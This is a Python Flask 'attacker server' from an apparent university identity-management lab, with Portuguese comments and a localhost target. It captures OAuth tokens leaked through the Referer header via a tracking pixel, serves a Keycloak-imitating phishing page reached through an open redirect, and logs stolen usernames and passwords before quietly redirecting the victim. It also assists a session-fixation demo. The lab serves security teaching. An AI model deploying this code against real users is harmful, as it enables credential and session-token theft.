"""
GID Lab - Grupo 4
Attacker Server — porta 9999

Simula o servidor controlado pelo atacante.
Usado nas demonstrações de:

  A-06: captura tokens via header Referer
        (SP1 carrega recursos deste servidor após login)

  A-07: página de phishing destino do Open Redirect
        (utilizador é redireccionado aqui após login no IdP)

  A-09: endpoint auxiliar para ver session IDs activos
"""

from flask import Flask, request, jsonify, render_template, redirect, make_response
from datetime import datetime

app = Flask(__name__)

# ------------------------------------------------------------------
# Armazenamento em memória dos eventos capturados
# ------------------------------------------------------------------
captured_events = []   # lista de dicts com os dados capturados

def log_event(attack, source, details, token=""):
    """Regista um evento capturado."""
    event = {
        "id":        len(captured_events) + 1,
        "timestamp": datetime.now().strftime("%H:%M:%S"),
        "attack":    attack,
        "source_ip": request.remote_addr,
        "source":    source,
        "details":   details,
        "token":     token,   # token completo (para copiar no dashboard)
    }
    captured_events.append(event)
    print(f"\n{'='*60}")
    print(f"[CAPTURADO] {attack} @ {event['timestamp']}")
    print(f"  IP: {event['source_ip']}")
    print(f"  {details}")
    print(f"{'='*60}")
    return event


# ------------------------------------------------------------------
# A-06 | Endpoints que capturam tokens via Referer Header
# ------------------------------------------------------------------

@app.route("/pixel.gif")
def pixel():
    """
    [A-06] Recurso externo carregado pelo SP1 após login.
    O browser envia automaticamente o header Referer com a URL
    completa do SP1 — que contém o access_token como query param.
    """
    referer = request.headers.get("Referer", "")
    token   = ""

    # Extrair token do Referer se presente
    if "token=" in referer:
        try:
            token = referer.split("token=")[1].split("&")[0]
        except Exception:
            token = "(erro ao extrair)"

    details = f"Referer: {referer[:300]}"
    if token:
        details += f"\n  TOKEN CAPTURADO: {token[:80]}..."

    log_event("A-06: Token via Referer", "pixel.gif", details, token=token)

    # Devolver um pixel GIF transparente 1x1
    gif = (
        b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00"
        b"\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00"
        b"\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02"
        b"\x44\x01\x00\x3b"
    )
    response = make_response(gif)
    response.headers["Content-Type"]  = "image/gif"
    response.headers["Cache-Control"] = "no-store"
    # SEM Referrer-Policy — o browser envia o Referer por defeito
    return response


@app.route("/log")
def log_request():
    """
    [A-06] Endpoint alternativo — mesmo comportamento que /pixel.gif
    mas devolve JSON. Usado pelo script JS no SP1.
    """
    referer = request.headers.get("Referer", "")
    token   = ""

    if "token=" in referer:
        try:
            token = referer.split("token=")[1].split("&")[0]
        except Exception:
            token = "(erro ao extrair)"

    details = f"Referer: {referer[:300]}"
    if token:
        details += f"\n  TOKEN CAPTURADO: {token[:80]}..."

    event = log_event("A-06: Token via Referer", "/log endpoint", details, token=token)

    response = jsonify({"status": "logged", "event_id": event["id"]})
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response


# ------------------------------------------------------------------
# A-07 | Página de phishing (destino do Open Redirect)
# ------------------------------------------------------------------

@app.route("/malicious")
def malicious():
    """
    [A-07] Página de phishing que imita o Keycloak.
    O utilizador é redireccionado aqui depois de
    http://localhost:5001/login?next=http://localhost:9999/malicious
    """
    log_event(
        "A-07: Open Redirect",
        request.referrer or "directo",
        f"Utilizador aterrou na página de phishing. IP: {request.remote_addr}"
    )
    return render_template("phishing.html")


@app.route("/steal-credentials", methods=["POST"])
def steal_credentials():
    """
    [A-07] Recebe as credenciais introduzidas na página de phishing.
    """
    username = request.form.get("username", "")
    password = request.form.get("password", "")

    log_event(
        "A-07: Credenciais Roubadas",
        "phishing form POST",
        f"username={username}  password={password}"
    )
    # Redireciona para o portal real — a vítima pensa que o login funcionou
    # e não suspeita que as credenciais foram roubadas
    return redirect("http://localhost:5001/")


# ------------------------------------------------------------------
# A-09 | Endpoint auxiliar para Session Fixation
# ------------------------------------------------------------------

@app.route("/fixate")
def fixate():
    """
    [A-09] Simula o passo inicial do atacante:
    - O atacante obtém um session ID do SP1 (visitando-o sem fazer login)
    - Regista esse ID aqui para acompanhar o ataque
    """
    session_id = request.args.get("sid", "")
    if session_id:
        log_event(
            "A-09: Session Fixation",
            "attacker setup",
            f"Session ID a fixar: {session_id}"
        )
        return jsonify({
            "status":     "registered",
            "session_id": session_id,
            "next_step":  "Partilha este session ID com a vítima via cookie sp1_session"
        })
    return jsonify({"error": "Parâmetro 'sid' em falta"}), 400


# ------------------------------------------------------------------
# Dashboard do atacante — visualizar todos os eventos capturados
# ------------------------------------------------------------------

@app.route("/")
def dashboard():
    """Painel de controlo do atacante — mostra todos os eventos capturados."""
    return render_template("dashboard.html", events=list(reversed(captured_events)))


@app.route("/api/events")
def api_events():
    """API JSON — usado pelo dashboard para auto-refresh."""
    return jsonify(list(reversed(captured_events)))


@app.route("/clear")
def clear():
    """Limpa todos os eventos (para reset entre demos)."""
    captured_events.clear()
    return redirect("/")


# ------------------------------------------------------------------
# Run
# ------------------------------------------------------------------
if __name__ == "__main__":
    print("\n" + "="*60)
    print("  ATTACKER SERVER — GID Lab Grupo 4")
    print("  http://localhost:9999")
    print("  Dashboard: http://localhost:9999/")
    print("="*60 + "\n")
    app.run(host="0.0.0.0", port=9999, debug=True)
